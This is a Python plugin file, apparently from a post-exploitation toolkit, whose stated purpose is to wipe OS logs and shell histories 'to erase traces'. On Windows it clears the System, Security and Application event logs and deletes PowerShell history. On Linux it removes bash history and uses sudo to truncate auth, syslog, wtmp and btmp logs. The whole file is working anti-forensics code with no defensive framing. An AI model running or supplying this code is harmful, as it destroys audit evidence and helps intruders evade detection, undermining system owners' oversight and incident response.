from core.plugin_base import PluginBase
import subprocess
import sys

class LogCleanerPlugin(PluginBase):
    @property
    def name(self):
        return "log_cleaner"
    @property
    def description(self):
        return "Wipes key OS logs and shell histories to erase traces."
    def run(self, **kwargs):
        output = []
        if sys.platform.startswith('win'):
            # Windows event logs
            for log in ["System", "Security", "Application"]:
                cmd = f"wevtutil cl {log}"
                result = subprocess.getoutput(cmd)
                output.append(f"Cleared {log}: {result}")
            # PowerShell history
            subprocess.run('del $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt', shell=True)
            output.append("Cleared PowerShell history.")
        else:
            # Linux: Bash history, audit logs
            subprocess.run('rm -f ~/.bash_history', shell=True)
            subprocess.run('sudo truncate -s 0 /var/log/auth.log /var/log/syslog /var/log/wtmp /var/log/btmp', shell=True)
            output.append("Cleared bash and auth logs.")
        return "\n".join(output)

def get_plugin():
    return LogCleanerPlugin()
